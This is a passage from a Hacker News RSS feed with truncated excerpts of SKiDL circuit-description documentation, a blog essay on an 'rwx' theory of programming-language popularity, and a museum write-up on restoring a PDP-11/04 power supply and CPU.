          <li><a href="#no-connects">No Connects</a></li>
          <li><a href="#net-and-pin-drive-levels">Net and Pin Drive Levels</a></li>
          <li><a href="#pin-net-bus-equivalencies">Pin, Net, Bus Equivalencies</a></li>
          <li><a href="#selectively-supressing-erc-messages">Selectively Supressing ERC Messages</a></li>
          <li><a href="#customizable-erc-using-ercassert">Customizable ERC Using <code>erc_assert()</code></a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#going-really-deep">Going Really Deep</a>
    <ul>
      <li><a href="#circuit-objects">Circuit Objects</a></li>
    </ul>
  </li>
  <li><a href="#converting-existing-designs-to-skidl">Converting Existing Designs to SKiDL</a></li>
  <li><a href="#spice-simulations">SPICE Simulations</a></li>
</ul>



<p>SKiDL is a module that allows you to compactly describe the interconnection of 
electronic circuits and components using Python.
The resulting Python program performs electrical rules checking
for common mistakes and outputs a netlist that serves as input to
a PCB layout tool.</p>

<p>First, let’s look at a “normal” design flow in <a href="https://kicad-pcb.org/">KiCad</a>:</p>

<p><img src="https://xesscorp.github.io/skidl/docs/_site/images/schematic-process-flow.png" alt="Schematic-based PCB design flow"></p>

<p>Here, you start off in a <em>schematic editor</em> (for KiCad, that’s EESCHEMA) and
draw a schematic. From that, EESCHEMA generates
a <em>netlist file</em> that lists what components are used and how their pins are interconnected.
Then you’ll use a <em>PCB layout tool</em> (like KiCad’s PCBNEW) to arrange the part footprints
and draw the wire traces that connect the pins as specified in the netlist.
Once that is done, PCBNEW outputs a set of <em>Gerber files</em> that are sent to a
<em>PCB fabricator</em> who will create a physical PCB and ship it to you.
Then you’ll post a picture of them on Twitter and promptly dump them
in a drawer for a few years because you got bored with the project.</p>

<p>In the SKiDL-based design flow, you use a <em>text editor</em> to create a <em>Python code file</em>
that employs the SKiDL library to describe interconnections of components.
This code file is executed by a <em>Python interpreter</em> and a netlist file is output.
From there, the design flow is identical to the schematic-based one
(including dumping the PCBs in a drawer).</p>

<p><img src="https://xesscorp.github.io/skidl/docs/_site/images/skidl-process-flow.png" alt="Schematic-based PCB design flow"></p>

<p>So, why would you <em>want</em> to use SKiDL?
Here are some of the features SKiDL brings to electronic design:</p>

<ul>
  <li>Requires only a text editor and Python.</li>
  <li>Has a powerful, flexible syntax (because it <em>is</em> Python).</li>
  <li>Permits compact descriptions of electronic circuits (think about <em>not</em> tracing
signals through a multi-page schematic).</li>
  <li>Allows textual descriptions of electronic circuits (think about using 
<code>diff</code> and <a href="https://en.wikipedia.org/wiki/Git">git</a> for circuits).</li>
  <li>Performs electrical rules checking (ERC) for common mistakes (e.g., unconnected device I/O pins).</li>
  <li>Supports linear / hierarchical / mixed descriptions of electronic designs.</li>
  <li>Fosters design reuse (think about using <a href="https://xesscorp.github.io/skidl/docs/_site/pypi.org">PyPi</a> and <a href="https://xesscorp.github.io/skidl/docs/_site/github.com">Github</a>
to distribute electronic designs).</li>
  <li>Makes possible the creation of <em>smart circuit modules</em> whose behavior / structure are changed parametrically
(think about filters whose component values are automatically adjusted based on your
desired cutoff frequency).</li>
  <li>Can work with any ECAD tool (only two methods are needed: one for reading the part libraries and another
for outputing the correct netlist format).</li>
  <li>Takes advantage of all the benefits of the Python ecosystem (because it <em>is</em> Python).</li>
  <li>Free software: MIT license.</li>
  <li>Open source: <a href="https://github.com/xesscorp/skidl">https://github.com/xesscorp/skidl</a></li>
</ul>

<p>As a very simple example, the SKiDL program below describes a circuit that
takes an input voltage, divides it by three, and outputs it:</p>

<div><div><pre><code><span>from</span> <span>skidl</span> <span>import</span> <span>*</span>

<span># Create input &amp; output voltages and ground reference.
</span><span>vin</span><span>,</span> <span>vout</span><span>,</span> <span>gnd</span> <span>=</span> <span>Net</span><span>(</span><span>'VI'</span><span>),</span> <span>Net</span><span>(</span><span>'VO'</span><span>),</span> <span>Net</span><span>(</span><span>'GND'</span><span>)</span>

<span># Create two resistors.
</span><span>r1</span><span>,</span> <span>r2</span> <span>=</span> <span>2</span> <span>*</span> <span>Part</span><span>(</span><span>"Device"</span><span>,</span> <span>'R'</span><span>,</span> <span>TEMPLATE</span><span>,</span> <span>footprint</span><span>=</span><span>'Resistor_SMD.pretty:R_0805_2012Metric'</span><span>)</span>
<span>r1</span><span>.</span><span>value</span> <span>=</span> <span>'1K'</span>   <span># Set upper resistor value.
</span><span>r2</span><span>.</span><span>value</span> <span>=</span> <span>'500'</span>  <span># Set lower resistor value.
</span>
<span># Connect the nets and resistors.
</span><span>vin</span> <span>+=</span> <span>r1</span><span>[</span><span>1</span><span>]</span>      <span># Connect the input to the upper resistor.
</span><span>gnd</span> <span>+=</span> <span>r2</span><span>[</span><span>2</span><span>]</span>      <span># Connect the lower resistor to ground.
</span><span>vout</span> <span>+=</span> <span>r1</span><span>[</span><span>2</span><span>],</span> <span>r2</span><span>[</span><span>1</span><span>]</span> <span># Output comes from the connection of the two resistors.
</span>
<span># Or you could do it with a single line of code:
# vin &amp;&amp; r1 &amp;&amp; vout &amp;&amp; r2 &amp;&amp; gnd
</span>
<span># Output the netlist to a file.
</span><span>generate_netlist</span><span>()</span>
</code></pre></div></div>

<p>And this is the netlist output that is passed to <code>PCBNEW</code> to
do the PCB layout:</p>

<div><div><pre><code>(export (version D)                                                                                    
  (design                                                                                              
    (source "C:\xesscorp\KiCad\tools\skidl\tests\vdiv.py")                                             
    (date "09/14/2018 08:49 PM")                                                                       
    (tool "SKiDL (0.0.23)"))                                                                           
  (components                                                                                          
    (comp (ref R1)                                                                                     
      (value 1K)                                                                                       
      (footprint Resistor_SMD.pretty:R_0805_2012Metric)                                                                 
      (fields                                                                                          
        (field (name description) Resistor)                                                            
        (field (name keywords) "r res resistor"))                                                      
      (libsource (lib device) (part R))                                                                
      (sheetpath (names /top/12995167876889795071) (tstamps /top/12995167876889795071)))               
    (comp (ref R2)                                                                                     
      (value 500)                                                                                      
      (footprint Resistor_SMD.pretty:R_0805_2012Metric)                                                                 
      (fields                                                                                          
        (field (name description) Resistor)                                                            
        (field (name keywords) "r res resistor"))                                                      
      (libsource (lib device) (part R))                                                                
      (sheetpath (names /top/8869138953290924483) (tstamps /top/8869138953290924483))))                
  (nets                                                                                                
    (net (code 0) (name GND)                                                                           
      (node (ref R2) (pin 2)))                                                                         
    (net (code 1) (name VI)                                                                            
      (node (ref R1) (pin 1)))                                                                         
    (net (code 2) (name VO)                                                                            
      (node (ref R1) (pin 2))                                                                          
      (node (ref R2) (pin 1))))                                                                        
)                                                                                                      
</code></pre></div></div>



<p>SKiDL is pure Python so it’s easy to install:</p>



<p>To give SKiDL some part libraries to work with,
you’ll also need to install <a href="http://kicad-pcb.org/">KiCad</a>.
Then, you’ll need to set an environment variable so SKiDL can find the libraries.
For Windows, do this:</p>

<div><div><pre><code>set KICAD_SYMBOL_DIR=C:\Program Files\KiCad\share\kicad\kicad-symbols
</code></pre></div></div>

<p>And for linux-type OSes, define the environment variable in your <code>.bashrc</code> like so:</p>

<div><div><pre><code>export KICAD_SYMBOL_DIR="/Library/Application Support/kicad/kicad-symbols"
</code></pre></div></div>

<p><strong>These paths are OS-dependent</strong>, so launch KiCAD and click <code>Preferences-&gt;Configure Paths</code>
to reveal the needed paths.</p>



<p>This is the minimum that you need to know to design electronic circuitry
using SKiDL:</p>

<ul>
  <li>How to get access to SKiDL.</li>
  <li>How to find and instantiate a component (or <em>part</em>).</li>
  <li>How to connect <em>pins</em> of the parts to each other using <em>nets</em>.</li>
  <li>How to run an ERC on the circuit.</li>
  <li>How to generate a <em>netlist</em> for the circuit that serves as input to a PCB layout tool.</li>
</ul>

<p>I’ll demonstrate these steps using SKiDL in an interactive Python session,
but normally the statements that are shown would be entered into a file and
executed as a Python script.</p>

<h2 id="accessing-skidl">Accessing SKiDL</h2>

<p>To use skidl in a project, just place the following at the top of your file:</p>



<p>But for this tutorial, I’ll just import everything:</p>



<h2 id="finding-parts">Finding Parts</h2>

<h3 id="command-line-searching">Command-line Searching</h3>

<p>SKiDL provides a convenience function for searching for parts called
(naturally) <code>search</code>.
For example, if you needed an operational amplifier, then the following command would
pull up some likely candidates:</p>

<div><div><pre><code><span>&gt;</span><span>&gt;&gt;</span> search<span>(</span><span>'opamp'</span><span>)</span>
<span>linear.lib: LT1492
linear.lib: MCP601SN (2.7V to 6.0V Single Supply CMOS Operational Amplifier, SO-8)
linear.lib: LM321 (Low Power Single Operational Amplifier)
linear.lib: MCP601R (2.7V to 6.0V Single Supply CMOS Operational Amplifier, SOT-23-5)
linear.lib: LM555N (Dual Op amp, rail-to-rail, 8MHz, MSOP8, SOIC8)
</span><span>...
</span><span>linear.lib: MCP603ST (2.7V to 6.0V Single Supply CMOS Operational Amplifier, with Chip Select, TSSOP-8)
linear.lib: NE5534 (Low-Noise High-Speed Audio Operational Amplifier)
linear.lib: LT1493
linear.lib: MCP601P (2.7V to 6.0V Single Supply CMOS Operational …</span></code></pre></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://xesscorp.github.io/skidl/docs/_site/">https://xesscorp.github.io/skidl/docs/_site/</a></em></p>]]>
            </description>
            <link>https://xesscorp.github.io/skidl/docs/_site/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974843</guid>
            <pubDate>Sun, 31 Jan 2021 01:28:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Rwx Theory of Programming Languages]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25974673">thread link</a>) | @harporoeder
<br/>
January 30, 2021 | https://blog.yossarian.net/2016/02/13/An-rwx-Theory-of-Programming-Languages | <a href="https://web.archive.org/web/*/https://blog.yossarian.net/2016/02/13/An-rwx-Theory-of-Programming-Languages">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<h2><em>Programming, philosophy, pedaling.</em></h2>

<ul>
    <li><a href="https://blog.yossarian.net/">Home</a></li>
    <li><a href="https://blog.yossarian.net/tags">Tags</a></li>
    <li><a href="https://blog.yossarian.net/favorites">Favorites</a></li>
    <li><a href="https://blog.yossarian.net/archive">Archive</a></li>
    
      <li><a href="https://yossarian.net/">Main Site</a></li>
    
</ul>

<hr>



<h2>
  <em>Feb 13, 2016</em>
</h2>

  <p>Tags:
  
    
    <a href="https://blog.yossarian.net/tags#programming">programming</a>
    
  
  </p>


<p>A great deal of effort has been expended on figuring out what makes a
programming language “good” (or, more accurately, <em>popular</em>).</p>

<p>What I’m about to propose is really just conjecture, but I think the conclusions
drawable from it are amusingly accurate.</p>

<h2 id="the-theory">The Theory</h2>

<p><em>The popularity of a given programming language can be described accurately
as if the language were a file on a Unix filesystem, with <strong>read</strong>, <strong>write</strong>,
and <strong>execute</strong> bits. A language with all three “bits” set is more likely to
be popular than a language with two or less.</em></p>

<p>That alone is fairly meaningless, so I’ll detail exactly what is meant by
“readability”, “writability”, and “executability”.</p>

<h2 id="readability">Readability</h2>

<p>What does it mean for a programming language to be readable? That’s an
inflammatory question.</p>

<p>At the risk of being overly simplistic and broad, I’ll say that a language’s
readability is largely a function of 3 characteristics:</p>

<h3 id="similarity-to-other-popular-languages-or-overall-styles">Similarity to other popular languages, or overall styles.</h3>

<p>To a certain extent, this characteristic can be simplified to a single question:</p>

<p><em>“How similar is it to C?”</em></p>

<p>For the last 50 years, the vast majority of programming has been done
in procedural fashion, in languages with syntaxes directly derived from
or heavily inspired by ALGOL and C. Even languages that aren’t directly
procedural (read: anything remotely object-oriented) regularly borrow
constructions from their ALGOL-derived cousins.</p>

<p>This doesn’t mean that ALGOL-like syntaxes are objectively <em>good</em>, just that
their universal familiarity has a tangible effect on how we approach <em>new</em>
languages.</p>

<p>For example, how do you feel about these function calling syntaxes?</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre>(1): foo(bar, baz, quux)
(2): foo bar baz quux
(3): foo bar withBaz: baz withQuux: quux
(4): [quux;baz;bar | foo]
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you’re like me, <code>(1)</code> is the most immediately understandable - it’s standard
function-with-arguments-separated-by-commas-in-parentheses-style. <code>(2)</code> might
also be fairly recognizable, if you’re used to working in a shell - it’s
utility-with-stringy-arguments-separated-by-whitespace-style. <code>(3)</code> will feel
familiar to Smalltalk programmers - the
receiver-object-taking-a-message-and-keyword-arguments-style. Finally, <code>(4)</code>
should feel relatively foreign to everybody - the argument list is reversed to
reflect the structure of the stack.</p>

<p>Without getting into which one of these styles is objectively best (I wouldn’t
be able to tell you), it’s apparent to most people that <code>(1)</code> is the most
<em>readable</em> simply by virtue of being so common. If I see <code>foo(bar, baz, quux)</code>
in a language I’ve never used before, I can be <em>relatively</em> confident that it
will behave like the other languages I’ve seen it in. The principle would be
the same, even if we lived in a world where Smalltalk or Lisp styles were
overwhelmingly popular.</p>

<h3 id="apparent-meaning">Apparent meaning.</h3>

<p>If you had (or have) never written a line of code in your life, which one of
these lines is most apparent in meaning? It’s okay if neither is apparent:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>(1): foobar[0]
(2): foobar.first
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Although <code>(1)</code> is what I learned first and is significantly more common, I find
<code>(2)</code> much more apparent. Compared to <code>(1)</code>, which requires that I know that
arrays are (usually) zero-based and accessed with <code>[]</code>, <code>(2)</code> only requires
that I recognize what I want (getting the first element of <code>foobar</code>) and
the general pattern for “doing things” from the line’s surroundings (calling a
method on an object with <code>.</code>).</p>

<p>What about this pair?</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
</pre></td><td><pre>(1): foo = bar * baz + quux
(2): = foo + * bar baz quux
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code>(2)</code> is conceptually cleaner (no memorization of
<a href="https://en.wikipedia.org/wiki/Order_of_operations">PEMDAS</a> required), but it’s
also significantly less apparent to someone who’s already gone through
basic arithmetic with infix notation.</p>

<p>These are simple examples, but I think that they demonstrate a truth in
language design that we’re often not willing to admit, namely that precedent
and apparency matter more than conceptual purity. It’s nice to think of
radically new languages the reimagine common operations in</p>

<h3 id="complexity-of-mental-representation">Complexity of mental representation.</h3>

<p>This ties closely into apparent meaning, although it’s slightly different.</p>

<p>Consider each of the following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>for</span><span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>foobar</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++)</span> <span>{</span>
	<span>foobar</span><span>[</span><span>i</span><span>].</span><span>baz</span><span>();</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>



<p>In both examples, I call <code>baz</code> on every element in the <code>foobar</code> array.</p>

<p>However, in the first one, I have to keep track of an index variable (<code>i</code>), a
loop condition and iteration (<code>i &lt; foobar.length; i++</code>), and a new scope (<code>{}</code>).</p>

<p>In the second one, I take advantage of a little bit of magic in the form of
an <code>each</code> method and a <code>:baz</code> symbol to reduce <em>N</em> operations to a single line.
I don’t have to worry about my index variable, the correctness of my condition,
or my scope.</p>

<p>Although <code>(1)</code> is probably more immediately <em>apparent</em> and much more similar
to currently popular styles, it also requires me to maintain a mental
representation of <em>details irrelevant to what I’m actually trying to
accomplish</em>. I don’t want (or need) to know <em>how</em> each element is accessed or
that there are <code>foobar.length</code> elements, I just want to apply <code>baz</code>.</p>

<h2 id="writability">Writability</h2>

<p>A programming language’s writability is closely related to its readability.
The readability of a language refers to analyzing idiomatic programs written by
<em>everybody</em>, while the writability of a language refers to an <em>individual’s</em>
ability to <em>produce</em> idiomatic programs.</p>

<p>My thoughts on writability fall into a few already well-defined categories:</p>

<h3 id="pola">POLA</h3>

<p>POLA stands for the
<a href="https://en.wikipedia.org/wiki/Principle_of_least_astonishment">Principle of Least Astonishment</a>.</p>

<p>It’s hard to think of a language that is uniformly unastonishing (in a good
way!), but I often point to Ruby as one that <em>can</em> be unastonishing.</p>

<p>Ruby’s <a href="http://ruby-doc.org/core-2.3.0/Array.html">Array</a> class is a good
example of this. Compare the following code snippets:</p>

<h4 id="testing-an-array-for-emptiness">Testing an array for emptiness</h4>

<p>Python:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>foobar</span> <span>=</span> <span>[]</span>

<span>not</span> <span>foobar</span> <span># =&gt; True
# OR
</span><span>len</span><span>(</span><span>foobar</span><span>)</span> <span>==</span> <span>0</span> <span># =&gt; True
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Java:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>foobar</span> <span>=</span> <span>{};</span>

<span>foobar</span><span>.</span><span>length</span> <span>==</span> <span>0</span> <span>// =&gt; true</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ruby:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>foobar</span> <span>=</span> <span>[]</span>

<span>foobar</span><span>.</span><span>empty?</span> <span># =&gt; true</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="testing-an-array-for-element-inclusion">Testing an array for element inclusion</h4>

<p>Python:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>foobar</span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span>

<span>6</span> <span>in</span> <span>foobar</span> <span># =&gt; False
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Java:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
</pre></td><td><pre><span>foobar</span> <span>=</span> <span>{</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>};</span>
<span>found</span> <span>=</span> <span>false</span><span>;</span>

<span>for</span> <span>(</span><span>i</span> <span>:</span> <span>foobar</span><span>)</span> <span>{</span>
	<span>if</span> <span>(</span><span>i</span> <span>==</span> <span>6</span><span>)</span> <span>{</span>
		<span>found</span> <span>=</span> <span>true</span><span>;</span>
		<span>break</span><span>;</span>
	<span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ruby:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>foobar</span> <span>=</span> <span>[</span><span>1</span><span>..</span><span>5</span><span>]</span>

<span>foobar</span><span>.</span><span>include?</span><span>(</span><span>6</span><span>)</span> <span># =&gt; false</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>In both examples, the Ruby solution is fairly unastonishing. Predicates are
trailed by “<code>?</code>”, and are single English words corresponding to their behavior.</p>

<p>The Python examples tend to be equally short, but not as unastonishing.
<code>not foobar</code> relies on empty arrays being considered falsey (just be careful
with tuples!). Checking the length is not particularly astonishing (aside from
<code>len()</code> being called from the global namespace), but “the size of <code>foobar</code> is
zero” is an awfully roundabout way of saying “<code>foobar</code> is empty”.</p>

<p>The first Java example is about as short and astonishing as its Python
counterpart. The second one, on the other hand, is absolutely insane. It
could be shortened by using a helper like <code>Arrays.asList(foobar).contains(6)</code>,
except that this is invalid (primitives and Java generics don’t mix) and
also completely astonishing (an <code>Arrays</code> class? <code>asList</code>?).</p>

<h3 id="timtowtdi">TIMTOWTDI</h3>

<p><a href="https://en.wikipedia.org/wiki/There's_more_than_one_way_to_do_it">There’s more than one way to do it</a>
is a longstanding Perl principle. People don’t often think of Perl when it
comes to <em>readability</em>, but I would argue that it is one of the most
<em>writable</em> languages (perhaps even
<a href="https://en.wikipedia.org/wiki/Write-only_language">write-only</a>).</p>

<p>Some examples:</p>

<h4 id="a-read-loop-that-capitalizes-input-and-spits-it-back">A read-loop that capitalizes input and spits it back</h4>

<p>In C, this would involve buffering <code>stdin</code> in a loop, converting each character
to its uppercase equivalent (don’t forget Unicode!), and printing them back out.
The process in Java would be similar.</p>

<p>In Perl:</p>



<p>a little more explicitly (and off of the command line):</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>while</span> <span>(</span><span>&lt;&gt;</span><span>)</span> <span>{</span>
	<span>print</span> <span>uc</span><span>;</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>even more explicit:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>while</span> <span>(</span><span>my</span> <span>$line</span> <span>=</span> <span>&lt;</span><span>STDIN</span><span>&gt;</span><span>)</span> <span>{</span>
	<span>print</span> <span>uc</span><span>(</span><span>$line</span><span>);</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>and so on:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre><span>while</span> <span>(</span><span>my</span> <span>$line</span> <span>=</span> <span>readline</span><span>(</span><span>*STDIN</span><span>))</span> <span>{</span>
	<span>print</span> <span>uc</span><span>(</span><span>$line</span><span>));</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Although this may seem like a shortcut to terse and unreadable code, it
<em>is</em> a legitimate reason to like a language (and enjoy writing in it). Perl
provides an astounding number of primitives and shortcuts for common operations
(<a href="http://perldoc.perl.org/perlop.html">look at all of these operators!</a>), making
quick scripting painless and straightforward.</p>

<p>(By the way, the Ruby version: <code>ruby -pe '$_.upcase!'</code>).</p>

<h2 id="executability">Executability</h2>

<p>This is probably the murkiest of the three “bits”.</p>

<p>Let’s clarify it:</p>

<h3 id="ease-of-setup">Ease of setup</h3>

<p>Let’s say I found a cool program written in “Etaoin”. How am I going to run it?</p>

<p>If Etaoin is compiled and the developer was kind enough to provide a package
or installer, I’d probably just download their package and let my system take
care of the little details. The is the <strong>best case scenario</strong>.</p>

<p>But what if Etaoin is interpreted? Well, the developer <em>might</em> bundle the
interpreter into a package, but this would be a bit overkill. It would probably
be better to install Etaoin discretely, a process that involves either a package
or manual compilation, depending on Etaoin’s popularity.</p>

<p>Once I’ve got the interpreter, what about the program’s dependencies? Does
Etaoin have a package manager? Are the dependencies available through it? Are
they compatible with my release of the language? Am I going to need other
languages and tools to build them?</p>

<p>Whenever I see a new language or an interesting project written in a new
language, these are the very first questions I ask. It’s a lot harder to
justify installing a relatively simple program If it requires me to manually
build an interpreter and dependencies, solely by virtue of being written in an
uncommon language.</p>

<p>Of course, this is not a completely fair or accurate characterization. It’s a
little ridiculous to place the onus of “executability” solely upon package
maintainers.</p>

<h3 id="integration-with-the-system">Integration with the system</h3>

<p>Now that I have Etaoin all set up, it’s time to run this cool program.</p>

<p>But wait, Etaoin programs run in a virtual machine that needs to be invoked:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>$ </span>etaoin cool_program <span># runs cool_program.et</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This isolation between my system and the …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.yossarian.net/2016/02/13/An-rwx-Theory-of-Programming-Languages">https://blog.yossarian.net/2016/02/13/An-rwx-Theory-of-Programming-Languages</a></em></p>]]>
            </description>
            <link>https://blog.yossarian.net/2016/02/13/An-rwx-Theory-of-Programming-Languages</link>
            <guid isPermaLink="false">hacker-news-small-sites-25974673</guid>
            <pubDate>Sun, 31 Jan 2021 01:02:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PDP-11/04 – Restoration – Finished]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25974507">thread link</a>) | @segfaultbuserr
<br/>
January 30, 2021 | http://www.datormuseum.se/computers/digital-equipment-corporation/pdp-11-04 | <a href="https://web.archive.org/web/*/http://www.datormuseum.se/computers/digital-equipment-corporation/pdp-11-04">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span face="verdana, sans-serif">Of course some nice soul has scanned the&nbsp;</span><a href="http://bitsavers.informatik.uni-stuttgart.de/pdf/dec/unibus/EK-BA11L-TM-001_Oct77.pdf">BA11L maintenance manual</a><span face="verdana, sans-serif">&nbsp;which describes in detail the inner workings of the power supply.&nbsp;<br></span></p><div><p><span face="verdana, sans-serif">The big filtering capacitors rated at 50 V 22000uf to filter the raw DC was able to charge through a 10k resistor perfectly well and the leakage was very small. The output capacitor for 5V was in worse shape. A 3900 uF / 6VDC Sprague with impressive connectors never managed to get to the nominal voltage even using a 560 ohm resistor and plenty of time. <br></span></p><p><span face="verdana, sans-serif">&nbsp;<p><a href="http://i.imgur.com/O4FWlpH.png" imageanchor="1"><img alt="Capacitor replacement" src="http://i.imgur.com/O4FWlpH.png"></a></p><br><span><img alt="Zooma in (verklig storlek: 800 x 598)" src="http://elektronikforumet.com/forum/images/spacer.gif" title="Zooma in (verklig storlek: 800 x 598)"></span><p>Nowadays there are no such capacitors as 3900 uF / 6VDC with screw connectors so I replaced it with a 6800uF / 40VDC RIFA&nbsp; </p></span></p><p><span face="verdana, sans-serif">With a new capacitor the power supply managed well to deliver 3 Amps in my dummy load which after while smelt nicely from hot pertinax<br></span></p><p><span face="verdana, sans-serif"><p><a href="http://i.imgur.com/3v9ATUo.jpg" imageanchor="1"><img alt="test" src="http://i.imgur.com/3v9ATUo.jpg"></a></p><br><span><img alt="Zooma in (verklig storlek: 1000 x 747)" src="http://elektronikforumet.com/forum/images/spacer.gif" title="Zooma in (verklig storlek: 1000 x 747)"></span><p>But does the it work if one connects the power supply to the back plane? Unfortunately it doesn't. Apparently two signals from the power supply was permanently in low state, BUS DC LO L and BUS AC LO L. These are active low signals and in its' low state the inhibits the clock generation of the main CPU.</p></span></p><p><span face="verdana, sans-serif">The schematics above describes the 5V regulator of the H777 power supply. The blue marked area is a current source circuit which is fed by incoming raw DC and which charges a 50uF capacitor which thus creates a nice ramp signal. A resistor ladder circuit and a number of comparators generate the BUS DC LO L, BUS AC LO L and an internal signal which causes the clock signal to the main PWM switch. The voltage over the capacitor never exceeded 20.4 V which was not enough to get the two of the comparators to change polarity. It seems like to much current is consumed from the current source. The capacitor was replaced, but no difference. But the current source was not only connected to the capacitor. It was also connected to the red marked area which is a crow bar circuit. If any of the main switch transistors would fail a 38 V raw DC would be the result on the output. Not very good. Therefore there is a zener diode and a couple of thyristors which fires off if the output voltage exceeded 5.6 VDC. This will also short circuit the current source, effectively stopping all activities in&nbsp; power supply. The problem seemed to be that even under normal circumstances 1.5 mA was consumed by leakage in the thyristor even though hasn't fired. Apparently all thyristors have leakages but not this much.<p><a href="http://i.imgur.com/U0GunMu.png" imageanchor="1"><img alt="Thyristor" height="389" src="http://i.imgur.com/U0GunMu.png" width="400"></a></p><p>Change of thyristor to a modern BT145 resulted in a fully functional power supply!</p><p><span>Testing the CPU</span></p><p>All cables were connected and the power was switched on. No smoke leaked anywhere which was a good sign. But the RUN lamp were just flashing briefly. Pressing INIT switch on the console only gave a short blink of the RUN lamp. Not very promising.</p><p>A check with the oscilloscope on the main clock signal of then CPU board showed that is starts up does 8 cycles, the stops for a couple micro seconds then does three more cycles, yet another stop and the three cycles and then nothing.</p><p><span><img alt="Zooma in (verklig storlek: 1200 x 961)" src="http://elektronikforumet.com/forum/images/spacer.gif" title="Zooma in (verklig storlek: 1200 x 961)"></span></p><p><a href="http://i.imgur.com/O3QASBs.png" imageanchor="1"><img alt="8 micro cycles" src="http://i.imgur.com/O3QASBs.png"></a></p><br>From the picture above one can deduce that the cycle time is closer to 250 ns rather than 260 ns&nbsp; specified in "Computer Engineering". However using a delay line in a feedback loop may not be that accurate. 4 MHz is a quite impressive speed at least in the mid seventies. </span></p><p><span face="verdana, sans-serif">Further than this is probably not possible using an oscilloscope only. For that purpose I have gotten this little USB connected tool:<br></span></p><p><span face="verdana, sans-serif">But to cover the entire machine with address and data bus one would need four of these. Luckily at this point in time I was offered to buy a HP1664A logic analyser at an affordable price!<br></span></p><div><p><span face="verdana, sans-serif"><b>Logic&nbsp;analyser&nbsp;fault tracing</b></span></p><p><span face="verdana, sans-serif">After some initial problems which was caused by mixed-up signals and also forgetting that the machine is active low I got some good traces from the analyser:<br></span></p><div><p><span face="verdana, sans-serif"><p><a href="http://i.imgur.com/SPIxi1B.png" imageanchor="1"><img alt="micro code" src="http://i.imgur.com/SPIxi1B.png"></a></p><p>The picture above shows the output of the micro address pipeline register. So it actually shows the second micro step as the first micro-step. But this is actually the correct sequence comparing to this <a href="http://vaxhaven.com/images/1/11/EK-KD11D-TM-PRE.pdf">document</a>. </p><p><a href="http://i.imgur.com/vCoTm8v.png" imageanchor="1"><img alt="Address bus and databus" src="http://i.imgur.com/vCoTm8v.png"></a></p><br>The interesting with this trace is that the CPU output addresses 24 and the 26 on the address bus. On the data bus it then receives 165020 which is the to be PC to start execution at after power fail, this is also the first address of the diagnostics program of the M9312. But looking at the address the CPU subsequently outputs on the address bus it is 167020. For some reason bit 10 has became high! Measuring more closely on a bus receiver chip, DS8641 shows that even though the input is at 3.31 V the output is a 3.78 V! This seems to be wrong!</span></p><p><span><span face="verdana, sans-serif">It is alive</span></span></p><p><span face="verdana, sans-serif"><b><br></b>This is the little evil thing:<p><a href="http://i.imgur.com/XojS9FU.png" imageanchor="1"><img alt="DS8641" height="320" src="http://i.imgur.com/XojS9FU.png" width="319"></a></p><br>Unfortunately DS8641 is not a very common IC. It is especially adapted to Digital open collector buses. I ordered some from a seller on Ebay located in China but since the delivery time is quite long I resorted to desoldered an IC from another board and replaced the faulty chip on the CPU board.<p>This time the result was much better:</p></span></p><p><span face="verdana, sans-serif"><p><a href="http://i.imgur.com/soZUSxo.png" imageanchor="1"><img alt="Waiting for TX ready" 